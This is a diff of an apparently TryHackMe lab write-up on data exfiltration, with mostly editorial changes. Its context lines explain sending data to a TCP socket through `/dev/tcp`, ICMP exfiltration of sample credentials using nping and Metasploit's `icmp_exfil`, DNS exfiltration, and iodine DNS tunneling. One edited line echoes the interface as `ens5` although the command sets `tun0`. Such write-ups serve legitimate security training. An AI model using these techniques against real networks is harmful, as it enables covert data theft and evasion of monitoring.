@@ -36,7 +36,7 @@ It consists of two separate networks with multiple clients as well as a Jumpbox 
 | icmp.thm.com     | 192.168.0.121  | Net 2              |
 | victim1.thm.com  | 192.168.0.101  | Net 2              |
 
-It is recommended to connect via SSH to the Jumpbox machine, and perform the rooms exercises from there. 
+It is recommended to connect via SSH to the Jumpbox machine, and perform the room exercises from there. 
 
 The room's author also suggests using `tmux` to manage the SSH connections needed. Another way, is to first connect to Jumpbox via SSH, then open a new terminal tab, connect to Jumpbox again, and from there connect to the required machine, e.g. `victim1`.
 
@@ -95,7 +95,7 @@ This method is **easy to detect** as it relies on non-standard protocols, so it 
 
     4. `|` Another pipe operator.
 
-    5. `dd conv=ebcdic` This command is using the `dd` utility to perform low-level data copying and conversion. The `conv=ebcdic` option is used to convert the data from *ASCII* to *EBCDIC* encoding. *EBCDIC* is another character encoding standard, mostly used on older IBM systems.
+    5. `dd conv=ebcdic` This command is using the `dd` utility to perform low-level data copying and conversion. The `conv=ebcdic` option is used to convert the data from *ASCII* to *EBCDIC* encoding. [*EBCDIC*](https://www.techtarget.com/whatis/definition/EBCDIC-Extended-Binary-Coded-Decimal-Interchange-Code) is another character encoding standard, primarily used in IBM mainframes.
 
     6. `> /dev/tcp/192.168.0.133/8080` This part of the command redirects the output to the IP address 192.168.0.133 on port 8080 using a TCP socket.
 
@@ -268,12 +268,11 @@ The above PHP script will handle POST requests via the `file` parameter and stor
 
 4. Finally, we need to decode the data:
 
-    ```shell
-    base64 -d /tmp/http.bs64 | tar xvfz -
-    ```
+    ![Decoding Data](task6-decoding-data.png)
+
 ### 5.3 HTTP tunneling
 
-In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter runs locally and provides services only for the internal network.
+In our network configuration, the `uploader.thm.com` server is reachable from the Internet, but the `app.thm.com` and `flag.thm.com` servers are not. The latter two run locally and provide services only to the internal network.
 
 ![Uploader vs. app server](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/92004a7c6a572f9680f0056b9aa88baa.png)
 
@@ -374,7 +373,7 @@ Metasploit has a module called `icmp_exfil` which uses the same technique we jus
     msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKER_IP
     # BPF_FILTER => icmp and not src ATTACKER_IP
     msf6 auxiliary(server/icmp_exfil) > set INTERFACE tun0
-    # INTERFACE => tun0
+    # INTERFACE => ens5
 
     # run the module
     msf6 auxiliary(server/icmp_exfil) > run
@@ -388,14 +387,14 @@ Metasploit has a module called `icmp_exfil` which uses the same technique we jus
 
 2. This room has prepared the `icmp.thm.com` machine as the victim for this task, so we can log into it via SSH (first connect to Jumpbox, and from Jumpbox connect to `icmp.thm.com`). This machine has the [NPING](https://nmap.org/nping/) tool installed, which is part of the **NMAP** suite.
 
-    Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to "*^BOF*", followed by the filename being sent:
+    Once logged into the `icmp.thm.com`, we need to send the **BOF trigger** so that Metasploit starts writing to the disk. The **BOF trigger** defaults to `^BOF`, where `^` means at the start of the string, thus, we need to have `BOF` first followed by the filename being sent:
 
     ```shell
     # send the BOF trigger to the attacking machine
     thm@icmp-host:~$ sudo nping --icmp 10.10.106.32 --data-string "BOFfile.txt" -c 1 
     ```
 
-3. Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we sent the data without converting it to hex first, Metasploit did that for us:
+3. Now that we initiated the disk writing process, we can sent the data we want to exfiltrate, for example, the credentials `admin:password`. Note that we will send the data without converting it to hex first; Metasploit will do it for us:
 
     ```shell
     # send the data we want to exfiltrate to the attacking machine
@@ -465,7 +464,7 @@ The domain name consists of three parts. For instance, for `www.example.com`:
 **DNS records** are essential components of the DNS infrastructure that provide information about **how domain names should be resolved** to their corresponding IP addresses or other types of data. There are various DNS record types and each one serves a specific purpose. We will explain just the three that we will be using for this task:
 - `A` The **Address** record maps a domain name to an IPv4 address. 
 - `NS` The **Name Server** record specifies the authoritative name servers for a domain. These are responsible for providing DNS information about the domain.
-- `TXT` The **Text** record can store any text data and is can be used for various purposes.
+- `TXT` The **Text** record can store any text data and it can be used for various purposes.
 
 ### 7.1 DNS Configurations
 
@@ -483,7 +482,7 @@ The goal is for `attacker.thm.com` to access network devices on Network 1 throug
 
 ![Network 2 to Network 1 Access](https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/e6bf2c81281be5cf8515eeed22254643.png)
 
-The room author recommends to use the `jump.thm.com` machine for completing the task, so we will do just that. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:
+The room's author recommends to use the `jump.thm.com` machine for completing the task. This means, that we don't have to manually add the `A` and `NS` DNS records, as the following are already set up for us:
 
 |**DNS Record**|**Type**|**Value**|
 |---|---|---|
@@ -506,9 +505,9 @@ thm@jump-box:~$ ping test.thm.com -c 1
 ```
 
 The `dig` command works as follows:
-- `dig` Stands for **Domain Information Groper** and it is used for performing DNS lookups, i.e., querying DNS nameservers to obtain information about domain names, IP addresses, and other DNS-related data.
-- `+short` This is used to request a more concise output.
-- `test.thm.com` The domain name for which we want to perofrm a DNS query.
+1. `dig` Stands for **Domain Information Groper** and it is used for performing DNS lookups, i.e., querying DNS nameservers to obtain information about domain names, IP addresses, and other DNS-related data.
+2. `+short` This is used to request a more concise output.
+3. `test.thm.com` The domain name for which we want to perofrm a DNS query.
 
 We can answer the room's question by resolving `flag.thm.com`:
 
@@ -558,10 +557,10 @@ Our goal for this task is transferring the content of the `credit.txt` file from
     ```
 
     Breaking down the `tcpdump` command:
-    - `tcpdump` A command-line packet analyzer tool which allows us to capture and display network packets.
-    - `-i eth0` Specifies the network interface to capture packets from. 
-    - `udp port 53` A filter expression used to specify the packet type we want to capture. In this case, we specify port 53 which is most commonly associated with DNS traffic.
-    - `v` Enables verbose mode, which provides more detailed information about the captured packets.
+    1. `tcpdump` A command-line packet analyzer tool which allows us to capture and display network packets.
+    2. `-i eth0` Specifies the network interface to capture packets from. 
+    3. `udp port 53` A filter expression used to specify the packet type we want to capture. In this case, we specify port 53 which is most commonly associated with DNS traffic.
+    4. `v` Enables verbose mode, which provides more detailed information about the captured packets.
 
 2. We can now connect to `victim2.thm.com` through SSH (again, by first connecting to `jump.thm.com`):
 
@@ -694,23 +693,23 @@ To execute the content of `flag.tunnel.com` TXT record all we need to do is repl
 
 ### 7.4 DNS Tunneling
 
-DNS tunneling, aka *TCP over DNS*, is a technique used to bypass network security measures by encapsulating non-DNS traffic within DNS packets. It works like this:
+DNS tunneling, aka *TCP over DNS*, is a technique used to bypass network security measures by encapsulating non-DNS traffic within DNS packets. It involves:
 1. **Encapsulation**: In DNS tunneling, non-DNS data or commands are hidden within DNS queries or responses. This can include binary data, text, or even executable code.
 2. **Subdomain Creation**: The attacker creates subdomains under a malicious domain name they control (`tunnel.com`). Each subdomain represents a piece of the hidden data or a command.
 3. **DNS Queries**: The attacker's malware generates DNS queries to these subdomains, effectively trasmitting the encapsulated data.
 4. **DNS Server**: A malicious authoritative DNS server under the attacker's control receives these DNS queries.
 5. **Data Extraction**: The malicious DNS server extracts the hidden data or executes the received commands. The response, if any, is then sent back to the attacker's malware.
 
-![DNS tunneling process](https://bluecatnetworks.com/wp-content/uploads/2020/11/DNS-tunneling-1024x488.png)
+![DNS tunneling process](https://assets.website-files.com/5ff66329429d880392f6cba2/644cd0fd955aee02ec7135fb_How%20Does%20DNS%20Tunneling%20Works.jpg)
 
-For this task, we will be using `jump.thm.com` to log into `victim2.thm.com` (located in Network 1), to then pivot to `web.thm.com` (located in Network 2). We will use the [**iodine**](https://github.com/yarrick/iodine) for creating our DNS tunneling communications. To establish DNS tunneling we need to:
-1. Use the preconfigured nameserver, which points to the `attacker.thm.com` machine (`att.tunnel.com` -> `172.20.0.200`).
+For this task, we will be using `jump.thm.com` to log into `victim2.thm.com` (located in Network 1), to then pivot to `web.thm.com` (located in Network 2). We will use [**iodine**](https://github.com/yarrick/iodine) for creating our DNS tunneling communications. To establish DNS tunneling we need to:
+1. Use the preconfigured nameserver, `att.tunnel.com`, which points to the `attacker.thm.com`, `172.20.0.200`.
 2. Run the **iodined server** from `attacker.thm.com`.
 3. Run the **iodine application** from `jump.thm.com` to establish the connection.
 4. SSH to the machine on the created network interface to create a proxy over DNS.
 5. Once an SSH connection is established, we can use the local IP address and port as a proxy in FireFox. 
 
->**Iodine** is the client application, while **iodined** is the server.
+>**Iodine** is the client application, while **iodined** is the server!
 
 1. Let's start by **running the iodined server**:
 
